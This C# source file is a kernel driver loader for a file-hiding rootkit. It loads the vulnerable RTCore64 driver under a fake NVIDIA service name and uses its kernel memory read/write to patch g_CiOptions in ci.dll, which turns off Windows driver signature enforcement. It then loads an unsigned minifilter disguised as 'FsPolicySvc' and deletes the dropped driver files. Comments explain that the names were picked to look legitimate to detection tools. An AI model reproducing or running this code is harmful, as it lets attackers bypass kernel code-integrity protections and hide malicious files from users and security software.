using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace FileHider
{
    internal static class KernelLoader
    {
        // ─── Devices ────────────────────────────────────────
        const string DEVICE_PATH = @"\\.\FileHider";
        const string RTCORE_PATH = @"\\.\RTCore64";

        // ─── RTCore64 IOCTLs (from working example) ─────────
        const uint IOCTL_RT_READ = 0x80002048;
        const uint IOCTL_RT_WRITE = 0x8000204C;

        // ─── Hardcoded legit names (was random alnum20) ─────
        // These are what show up in `fltmc filters`, the minifilter
        // detector, and HKLM\SYSTEM\CurrentControlSet\Services.
        // Edit only these four if you want different names.
        const string RT_SERVICE_HARDCODED = "NvStreamKms";
        const string FH_SERVICE_HARDCODED = "FsPolicySvc";
        const string RT_TEMP_HARDCODED = "~NvStreamKms.tmp";
        const string FH_TEMP_HARDCODED = "~FsPolicySvc.tmp";

        // ─── Log file — next to exe, fallback to C:\ ────────
        static readonly string _logPath = PickLogPath();
        static readonly object _logLock = new object();

        static string PickLogPath()
        {
            try
            {
                string p = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "FileHider_load.log");
                File.AppendAllText(p, "");
                return p;
            }
            catch { return @"C:\FileHider_load.log"; }
        }

        static void Log(string s)
        {
            lock (_logLock)
            {
                try
                {
                    File.AppendAllText(_logPath,
                        DateTime.Now.ToString("HH:mm:ss.fff") + "  " + s + Environment.NewLine);
                }
                catch { }
            }
        }

        static void LogReset()
        {
            try { File.Delete(_logPath); } catch { }
            Log("=== FileHider load ===");
            Log("OS: " + Environment.OSVersion.VersionString);
            Log("Admin: " + IsAdmin());
            Log("Log: " + _logPath);
        }

        static bool IsAdmin()
        {
            var id = System.Security.Principal.WindowsIdentity.GetCurrent();
            return new System.Security.Principal.WindowsPrincipal(id)
                .IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }

        // ─── P/Invoke ───────────────────────────────────────
        [StructLayout(LayoutKind.Sequential)]
        struct UNICODE_STRING { public ushort Length; public ushort MaximumLength; public IntPtr Buffer; }

        [StructLayout(LayoutKind.Sequential)]
        struct LUID { public uint LowPart; public int HighPart; }

        [StructLayout(LayoutKind.Sequential)]
        struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID_AND_ATTRIBUTES Privileges; }

        [DllImport("ntdll.dll")] static extern int NtLoadDriver(ref UNICODE_STRING s);
        [DllImport("ntdll.dll")] static extern int NtUnloadDriver(ref UNICODE_STRING s);
        [DllImport("ntdll.dll")] static extern int NtQuerySystemInformation(int cls, IntPtr p, int sz, out int ret);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenProcessToken(IntPtr h, uint acc, out IntPtr tok);
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool LookupPrivilegeValue(string sys, string name, out LUID luid);
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool AdjustTokenPrivileges(IntPtr tok, bool dis, ref TOKEN_PRIVILEGES np, uint len, IntPtr prev, IntPtr ret);
        [DllImport("kernel32.dll")] static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern IntPtr CreateFile(string n, uint a, uint s, IntPtr sa, uint c, uint f, IntPtr t);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool DeviceIoControl(IntPtr h, uint code, IntPtr ib, uint isz, IntPtr ob, uint osz, out uint br, IntPtr ov);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr h);

        // ─── State ──────────────────────────────────────────
        static IntPtr _rt = IntPtr.Zero;
        static string _rtServiceName = null;
        static string _fhServiceName = null;
        static string _rtTempPath = null;
        static string _fhTempPath = null;

        // ─── Deterministic naming (kept for compatibility) ──
        // Still here in case anything references them, but the
        // public getters below no longer use them.
        static string MachineKey()
        {
            try
            {
                using (var k = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography"))
                    return (k?.GetValue("MachineGuid") as string) ?? "00000000-0000-0000-0000-000000000000";
            }
            catch { return "00000000-0000-0000-0000-000000000000"; }
        }

        static string DerivedHex8(string salt)
        {
            using (var sha = System.Security.Cryptography.SHA256.Create())
            {
                byte[] h = sha.ComputeHash(Encoding.UTF8.GetBytes("fh:" + salt + ":" + MachineKey()));
                var sb = new StringBuilder(8);
                for (int i = 0; i < 8; i++) sb.Append("0123456789abcdef"[h[i] & 0xF]);
                return sb.ToString();
            }
        }

        static string DerivedAlnum20(string salt)
        {
            using (var sha = System.Security.Cryptography.SHA256.Create())
            {
                byte[] h = sha.ComputeHash(Encoding.UTF8.GetBytes("fhs:" + salt + ":" + MachineKey()));
                const string alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                var sb = new StringBuilder(20);
                for (int i = 0; i < 20; i++) sb.Append(alphabet[h[i] % alphabet.Length]);
                return sb.ToString();
            }
        }

        // ─── Public name getters — now hardcoded, no random ─
        static string RtServiceName() { return RT_SERVICE_HARDCODED; }
        static string FhServiceName() { return FH_SERVICE_HARDCODED; }
        static string RtTempBase() { return RT_TEMP_HARDCODED; }
        static string FhTempBase() { return FH_TEMP_HARDCODED; }

        // ─── Privileges ─────────────────────────────────────
        static void EnableLoadDriverPrivilege()
        {
            IntPtr tok;
            if (!OpenProcessToken(GetCurrentProcess(), 0x20 | 0x8, out tok)) { Log("OpenProcessToken failed"); return; }
            try
            {
                LUID luid;
                if (!LookupPrivilegeValue(null, "SeLoadDriverPrivilege", out luid)) { Log("LookupPrivilegeValue failed"); return; }
                TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
                tp.PrivilegeCount = 1;
                tp.Privileges.Luid = luid;
                tp.Privileges.Attributes = 0x2;
                AdjustTokenPrivileges(tok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            }
            finally { CloseHandle(tok); }
        }

        static bool IsHvciEnabled()
        {
            try
            {
                using (var k = Registry.LocalMachine.OpenSubKey(
                    @"SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"))
                {
                    if (k == null) return false;
                    object v = k.GetValue("Enabled");
                    if (v == null) return false;
                    return Convert.ToInt32(v) == 1;
                }
            }
            catch { return false; }
        }

        // ─── Service key setup + NtLoadDriver ───────────────
        static int LoadDriverDirect(string serviceName, string binPath, bool isMinifilter)
        {
            string regPath = @"SYSTEM\CurrentControlSet\Services\" + serviceName;
            try
            {
                using (var k = Registry.LocalMachine.CreateSubKey(regPath))
                {
                    if (k == null) { Log("  CreateSubKey null for " + regPath); return -1; }

                    k.SetValue("Type", 1, RegistryValueKind.DWord);
                    k.SetValue("Start", 3, RegistryValueKind.DWord);
                    k.SetValue("ErrorControl", 1, RegistryValueKind.DWord);
                    k.SetValue("ImagePath", binPath, RegistryValueKind.String);

                    if (isMinifilter)
                    {
                        k.SetValue("Group", "FSFilter Anti-Virus", RegistryValueKind.String);
                        k.SetValue("SupportedFeatures", 3, RegistryValueKind.DWord);

                        string instName = serviceName + "Inst";
                        using (var inst = k.CreateSubKey("Instances"))
                        {
                            inst.SetValue("DefaultInstance", instName, RegistryValueKind.String);
                            using (var iname = inst.CreateSubKey(instName))
                            {
                                iname.SetValue("Altitude", "328990", RegistryValueKind.String);
                                iname.SetValue("Flags", 0, RegistryValueKind.DWord);
                            }
                        }
                    }
                }
                Log("  registry key written: " + regPath);
            }
            catch (Exception ex) { Log("  registry exception: " + ex.Message); return -1; }

            string ntPath = @"\Registry\Machine\SYSTEM\CurrentControlSet\Services\" + serviceName;
            UNICODE_STRING us = new UNICODE_STRING();
            us.Buffer = Marshal.StringToHGlobalUni(ntPath);
            us.Length = (ushort)(ntPath.Length * 2);
            us.MaximumLength = (ushort)((ntPath.Length + 1) * 2);
            int status;
            try { status = NtLoadDriver(ref us); }
            finally { Marshal.FreeHGlobal(us.Buffer); }

            if (status == 0)
            {
                Log("  NtLoadDriver OK");
                if (isMinifilter) Thread.Sleep(200);
                DeleteBackingFileNow(binPath);
            }
            else
            {
                Log("  NtLoadDriver FAIL 0x" + status.ToString("X8") + " — " + StatusText(status));
                try { Registry.LocalMachine.DeleteSubKeyTree(regPath, false); } catch { }
            }
            return status;
        }

        static string StatusText(int st)
        {
            switch ((uint)st)
            {
                case 0xC000010E: return "STATUS_DRIVER_ALREADY_LOADED";
                case 0xC000036B: return "STATUS_INVALID_IMAGE_HASH (blocked/unsigned)";
                case 0xC000036C: return "STATUS_DRIVER_BLOCKED (vulnerable-driver list)";
                case 0xC0000603: return "STATUS_IMAGE_CERT_REVOKED";
                case 0xC0000034: return "STATUS_OBJECT_NAME_NOT_FOUND";
                case 0xC0000061: return "STATUS_PRIVILEGE_NOT_HELD";
                case 0xC0000022: return "STATUS_ACCESS_DENIED";
                case 0xC0000428: return "STATUS_INVALID_IMAGE_HASH";
                default: return "(unknown)";
            }
        }

        static int UnloadDriver(string serviceName)
        {
            if (string.IsNullOrEmpty(serviceName)) return -1;
            string regPath = @"SYSTEM\CurrentControlSet\Services\" + serviceName;
            try
            {
                using (var k = Registry.LocalMachine.CreateSubKey(regPath))
                {
                    if (k == null) return -1;
                    k.SetValue("Type", 1, RegistryValueKind.DWord);
                    k.SetValue("Start", 3, RegistryValueKind.DWord);
                    k.SetValue("ImagePath", @"\??\C:\nonexistent\" + serviceName, RegistryValueKind.String);
                }
            }
            catch { return -1; }

            string ntPath = @"\Registry\Machine\SYSTEM\CurrentControlSet\Services\" + serviceName;
            UNICODE_STRING us = new UNICODE_STRING();
            us.Buffer = Marshal.StringToHGlobalUni(ntPath);
            us.Length = (ushort)(ntPath.Length * 2);
            us.MaximumLength = (ushort)((ntPath.Length + 1) * 2);
            int status;
            try { status = NtUnloadDriver(ref us); }
            finally { Marshal.FreeHGlobal(us.Buffer); }

            if (status == 0)
                try { Registry.LocalMachine.DeleteSubKeyTree(regPath, false); } catch { }
            return status;
        }

        static void PreflightCleanup()
        {
            ForceDeleteServiceKey("RTCore64");
            ForceDeleteServiceKey("FileHider");
            ForceDeleteServiceKey("NtfsCleanup");
            ForceDeleteServiceKey(RtServiceName());
            ForceDeleteServiceKey(FhServiceName());
        }

        static void ForceDeleteServiceKey(string name)
        {
            for (int i = 0; i < 10; i++)
            {
                bool exists = false;
                try
                {
                    using (var k = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\" + name))
                        exists = k != null;
                }
                catch { }
                if (!exists) return;
                try
                {
                    using (var k = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services", true))
                        if (k != null) try { k.DeleteSubKeyTree(name, false); } catch { }
                }
                catch { }
                Thread.Sleep(100);
            }
        }

        static void DeleteBackingFileNow(string binPath)
        {
            if (string.IsNullOrEmpty(binPath)) return;
            string native = binPath;
            if (native.StartsWith(@"\??\")) native = native.Substring(4);
            for (int i = 0; i < 25; i++)
            {
                try
                {
                    try { File.SetAttributes(native, FileAttributes.Normal); } catch { }
                    File.Delete(native);
                    if (!File.Exists(native)) return;
                }
                catch { }
                Thread.Sleep(40);
            }
        }

        // ─── RTCore64 IOCTL wrappers ────────────────────────
        static uint Rd32(ulong a)
        {
            if (_rt == IntPtr.Zero || _rt == new IntPtr(-1)) return 0;
            IntPtr buf = Marshal.AllocHGlobal(48);
            try
            {
                for (int i = 0; i < 48; i++) Marshal.WriteByte(buf, i, 0);
                Marshal.WriteInt64(buf, 0x08, (long)a);
                Marshal.WriteInt32(buf, 0x18, 4);
                uint br;
                if (!DeviceIoControl(_rt, IOCTL_RT_READ, buf, 48u, buf, 48u, out br, IntPtr.Zero)) return 0;
                return (uint)Marshal.ReadInt32(buf, 0x1C);
            }
            finally { Marshal.FreeHGlobal(buf); }
        }

        static bool Wr32(ulong a, uint v)
        {
            if (_rt == IntPtr.Zero || _rt == new IntPtr(-1)) return false;
            IntPtr buf = Marshal.AllocHGlobal(48);
            try
            {
                for (int i = 0; i < 48; i++) Marshal.WriteByte(buf, i, 0);
                Marshal.WriteInt64(buf, 0x08, (long)a);
                Marshal.WriteInt32(buf, 0x18, 4);
                Marshal.WriteInt32(buf, 0x1C, (int)v);
                uint br;
                return DeviceIoControl(_rt, IOCTL_RT_WRITE, buf, 48u, buf, 48u, out br, IntPtr.Zero);
            }
            finally { Marshal.FreeHGlobal(buf); }
        }

        // ─── ci.dll lookup + g_CiOptions scan ───────────────
        static bool GetMod(string name, out ulong baseAddr, out ulong size)
        {
            baseAddr = 0; size = 0;
            int len = 0;
            NtQuerySystemInformation(11, IntPtr.Zero, 0, out len);
            if (len <= 0) { Log("  NtQuerySystemInformation len=0"); return false; }

            IntPtr buf = Marshal.AllocHGlobal(len + 0x2000);
            try
            {
                if (NtQuerySystemInformation(11, buf, len + 0x2000, out len) != 0)
                { Log("  NtQuerySystemInformation 2nd call failed"); return false; }
                int count = Marshal.ReadInt32(buf);
                for (int i = 0; i < count; i++)
                {
                    IntPtr mp = (IntPtr)((long)buf + 8 + i * 0x128);
                    IntPtr ib = Marshal.ReadIntPtr(mp, 0x10);
                    int sz = Marshal.ReadInt32(mp, 0x18);
                    string n = Marshal.PtrToStringAnsi((IntPtr)((long)mp + 0x28));
                    if (n != null && n.IndexOf(name, StringComparison.OrdinalIgnoreCase) >= 0)
                    {
                        baseAddr = (ulong)ib.ToInt64();
                        size = (ulong)sz;
                        return true;
                    }
                }
            }
            finally { Marshal.FreeHGlobal(buf); }
            return false;
        }

        static ulong FindCiStrict(ulong ciBase, ulong ciSize)
        {
            uint mz = Rd32(ciBase);
            if (mz != 0x00905A4D) { Log("  ci.dll MZ mismatch: 0x" + mz.ToString("X8")); return 0; }

            int maxScan = (int)Math.Min((uint)ciSize, 0x80000);
            byte[] img = new byte[maxScan];
            for (int i = 0; i < maxScan; i += 4)
            {
                uint v = Rd32(ciBase + (ulong)i);
                img[i] = (byte)(v & 0xFF);
                if (i + 1 < maxScan) img[i + 1] = (byte)((v >> 8) & 0xFF);
                if (i + 2 < maxScan) img[i + 2] = (byte)((v >> 16) & 0xFF);
                if (i + 3 < maxScan) img[i + 3] = (byte)((v >> 24) & 0xFF);
            }

            int e = BitConverter.ToInt32(img, 0x3C);
            if (e <= 0 || e >= img.Length - 4) return 0;
            if (BitConverter.ToUInt32(img, e) != 0x00004550) return 0;

            int numSect = BitConverter.ToUInt16(img, e + 6);
            int optHdrSz = BitConverter.ToUInt16(img, e + 20);
            int sectOff = e + 24 + optHdrSz;

            var writable = new System.Collections.Generic.List<Tuple<ulong, ulong>>();
            for (int s = 0; s < numSect; s++)
            {
                int sh = sectOff + s * 40;
                if (sh + 40 > img.Length) break;
                uint vsz = BitConverter.ToUInt32(img, sh + 8);
                uint va = BitConverter.ToUInt32(img, sh + 12);
                uint ch = BitConverter.ToUInt32(img, sh + 36);
                bool w = (ch & 0x80000000) != 0;
                bool x = (ch & 0x20000000) != 0;
                if (w && !x) writable.Add(Tuple.Create(ciBase + va, ciBase + va + vsz));
            }
            if (writable.Count == 0) { Log("  no writable non-exec sections"); return 0; }
            Log("  writable sections: " + writable.Count);

            Func<ulong, bool> inWritable = addr =>
            {
                foreach (var t in writable)
                    if (addr >= t.Item1 && addr < t.Item2) return true;
                return false;
            };

            byte[][] pats = {
                new byte[] { 0x48,0x8B,0x05,0,0,0,0, 0x48,0x85,0xC0,0x74 },
                new byte[] { 0x48,0x8B,0x05,0,0,0,0, 0x8B,0x08 },
                new byte[] { 0x48,0x8B,0x05,0,0,0,0, 0x89,0x08 },
                new byte[] { 0x48,0x8B,0x05,0,0,0,0, 0x39,0x08 },
                new byte[] { 0x8B,0x05,0,0,0,0, 0x85,0xC0 },
                new byte[] { 0x8B,0x05,0,0,0,0, 0x83,0xE0 },
                new byte[] { 0x8B,0x0D,0,0,0,0 },
                new byte[] { 0xC7,0x05,0,0,0,0 },
                new byte[] { 0x48,0x8B,0x05,0,0,0,0, 0xC7,0x00 },
                new byte[] { 0x48,0x8B,0x05,0,0,0,0 },
            };
            int[] relOff = { 3, 3, 3, 3, 2, 2, 2, 2, 3, 3 };
            int[] insLen = { 7, 7, 7, 7, 6, 6, 6, 6, 7, 7 };

            var cand = new System.Collections.Generic.Dictionary<ulong, int>();
            for (int p = 0; p < pats.Length; p++)
            {
                byte[] pat = pats[p];
                for (int i = 0; i < img.Length - pat.Length; i++)
                {
                    bool m = true;
                    for (int j = 0; j < pat.Length; j++)
                        if (pat[j] != 0 && img[i + j] != pat[j]) { m = false; break; }
                    if (!m) continue;
                    int rel = BitConverter.ToInt32(img, i + relOff[p]);
                    ulong t = (ulong)((long)ciBase + i + insLen[p] + rel);
                    if (t < ciBase || t > ciBase + ciSize) continue;
                    if ((t & 0x3) != 0) continue;
                    if (!inWritable(t)) continue;
                    if (!IsValidCiValue(Rd32(t))) continue;
                    if (!cand.ContainsKey(t)) cand[t] = 0;
                    cand[t]++;
                }
            }
            Log("  candidates: " + cand.Count);
            if (cand.Count == 0) return 0;

            ulong best = 0; int bestCount = 0;
            foreach (var kv in cand)
                if (kv.Value > bestCount) { bestCount = kv.Value; best = kv.Key; }
            Log("  best candidate referenced " + bestCount + " time(s)");
            return best;
        }

        static bool IsValidCiValue(uint v)
        {
            return v == 0x6 || v == 0xE || v == 0xA || v == 0x1E ||
                   v == 0x0E || v == 0x0A || v == 0x16 || v == 0x26 ||
                   v == 0x2E || v == 0x36 || v == 0x3E;
        }

        // ─── Device probe ───────────────────────────────────
        static bool TryOpenDevice()
        {
            try
            {
                IntPtr h = CreateFile(DEVICE_PATH, 0, 0, IntPtr.Zero, 3, 0, IntPtr.Zero);
                if (h == new IntPtr(-1) || h == IntPtr.Zero) return false;
                CloseHandle(h);
                return true;
            }
            catch { return false; }
        }

        static bool WaitForDevice(int ms)
        {
            var sw = Stopwatch.StartNew();
            while (sw.ElapsedMilliseconds < ms)
            {
                if (TryOpenDevice()) return true;
                Thread.Sleep(100);
            }
            return TryOpenDevice();
        }

        // ─── Embedded resources ─────────────────────────────
        static byte[] ReadEmbedded(string logicalName)
        {
            try
            {
                var asm = Assembly.GetExecutingAssembly();
                using (var s = asm.GetManifestResourceStream(logicalName))
                {
                    if (s == null) return null;
                    byte[] b = new byte[s.Length];
                    int total = 0;
                    while (total < b.Length)
                    {
                        int r = s.Read(b, total, b.Length - total);
                        if (r <= 0) break;
                        total += r;
                    }
                    return b;
                }
            }
            catch { return null; }
        }

        // ═════════════════════════════════════════════════════
        //  MAIN FLOW  — mirrors the working example
        // ═════════════════════════════════════════════════════
        public static bool EnsureDriverLoaded()
        {
            LogReset();

            // 1. Probe
            if (TryOpenDevice()) { Log("[OK] device already loaded"); return true; }

            // 2. HVCI
            if (IsHvciEnabled()) { Log("[FAIL] HVCI/Memory Integrity is ON"); return false; }
            Log("[OK] HVCI off");

            // 3. Privileges
            EnableLoadDriverPrivilege();
            Log("[OK] SeLoadDriverPrivilege requested");

            // 4. Clean stale service keys
            PreflightCleanup();
            Log("[OK] stale service keys cleared");

            // 5. Extract RTCore64.bin
            byte[] rc = ReadEmbedded("RTCore64");
            if (rc == null) { Log("[FAIL] embedded RTCore64 resource missing"); return false; }
            Log("[OK] RTCore64 resource " + rc.Length + " bytes, MZ=" +
                (rc.Length >= 2 && rc[0] == 0x4D && rc[1] == 0x5A ? "yes" : "NO"));
            if (rc.Length < 2 || rc[0] != 0x4D || rc[1] != 0x5A)
            { Log("[FAIL] RTCore64 is not a PE file"); return false; }

            // 6. Write to temp
            _rtTempPath = Path.Combine(Path.GetTempPath(), RtTempBase());
            try { File.WriteAllBytes(_rtTempPath, rc); }
            catch (Exception ex) { Log("[FAIL] write RTCore64: " + ex.Message); return false; }
            Log("[OK] RTCore64 -> " + _rtTempPath);

            // 7. Load RTCore64
            _rtServiceName = RtServiceName();
            Log("[STEP] NtLoadDriver(RTCore64) service=" + _rtServiceName);
            int st = LoadDriverDirect(_rtServiceName, @"\??\" + _rtTempPath, false);
            if (st != 0) { Log("[FAIL] RTCore64 load 0x" + st.ToString("X8")); return false; }
            Log("[OK] RTCore64 loaded");

            Thread.Sleep(400);

            // 8. Open device
            _rt = CreateFile(RTCORE_PATH, 0xC0000000, 0, IntPtr.Zero, 3, 0, IntPtr.Zero);
            if (_rt == new IntPtr(-1) || _rt == IntPtr.Zero)
            {
                Log("[FAIL] cannot open " + RTCORE_PATH + " err=" + Marshal.GetLastWin32Error());
                _rt = IntPtr.Zero;
                UnloadDriver(_rtServiceName);
                return false;
            }
            Log("[OK] RTCore64 handle opened");

            // 9. Find ci.dll
            ulong ciBase, ciSize;
            if (!GetMod("ci.dll", out ciBase, out ciSize))
            { Log("[FAIL] ci.dll not found"); return false; }
            Log("[OK] ci.dll base=0x" + ciBase.ToString("X") + " size=0x" + ciSize.ToString("X"));

            uint mz = Rd32(ciBase);
            if (mz != 0x00905A4D)
            {
                Log("[FAIL] ci.dll MZ check 0x" + mz.ToString("X8") + " (RTCore64 read not working?)");
                return false;
            }
            Log("[OK] ci.dll MZ ok");

            // 10. Find g_CiOptions
            ulong gCi = FindCiStrict(ciBase, ciSize);
            if (gCi == 0) { Log("[FAIL] g_CiOptions not found"); return false; }
            Log("[OK] g_CiOptions=0x" + gCi.ToString("X16"));

            uint old = Rd32(gCi);
            if (!IsValidCiValue(old)) { Log("[FAIL] g_CiOptions value 0x" + old.ToString("X")); return false; }
            Log("[OK] g_CiOptions current = 0x" + old.ToString("X"));

            // 11. Patch DSE off
            if (!Wr32(gCi, 0)) { Log("[FAIL] Wr32(g_CiOptions, 0)"); return false; }
            Thread.Sleep(100);
            if (Rd32(gCi) != 0)
            { Log("[FAIL] write didn't stick"); Wr32(gCi, old); return false; }
            Log("[OK] DSE disabled");

            // 12. Extract FileHider.bin
            byte[] fh = ReadEmbedded("FileHider");
            if (fh == null)
            { Log("[FAIL] embedded FileHider resource missing"); Wr32(gCi, old); return false; }
            Log("[OK] FileHider resource " + fh.Length + " bytes");

            _fhTempPath = Path.Combine(Path.GetTempPath(), FhTempBase());
            try { File.WriteAllBytes(_fhTempPath, fh); }
            catch (Exception ex)
            { Log("[FAIL] write FileHider: " + ex.Message); Wr32(gCi, old); return false; }
            Log("[OK] FileHider -> " + _fhTempPath);

            // 13. Load FileHider as minifilter
            _fhServiceName = FhServiceName();
            Log("[STEP] NtLoadDriver(FileHider) service=" + _fhServiceName);
            int fhLoad = LoadDriverDirect(_fhServiceName, @"\??\" + _fhTempPath, true);
            if (fhLoad != 0)
            { Log("[FAIL] FileHider load 0x" + fhLoad.ToString("X8")); Wr32(gCi, old); return false; }
            Log("[OK] FileHider loaded");

            // 14. Restore DSE
            Wr32(gCi, old);
            Log("[OK] DSE restored");

            // 15. Wait for device
            if (!WaitForDevice(5000))
            { Log("[FAIL] FileHider device never appeared (check DbgView for FltRegisterFilter)"); return false; }
            Log("[OK] FileHider device reachable");

            // 16. Unload RTCore64
            if (_rt != IntPtr.Zero) { CloseHandle(_rt); _rt = IntPtr.Zero; }
            UnloadDriver(_rtServiceName);
            Log("[OK] RTCore64 unloaded");

            Log("=== SUCCESS ===");
            return true;
        }

        public static string GetLogPath() { return _logPath; }

        public static void ForceUnload()
        {
            LogReset();
            EnableLoadDriverPrivilege();
            if (!string.IsNullOrEmpty(_fhServiceName)) UnloadDriver(_fhServiceName);
            if (!string.IsNullOrEmpty(_rtServiceName)) UnloadDriver(_rtServiceName);
            Log("force unload complete");
        }
    }
}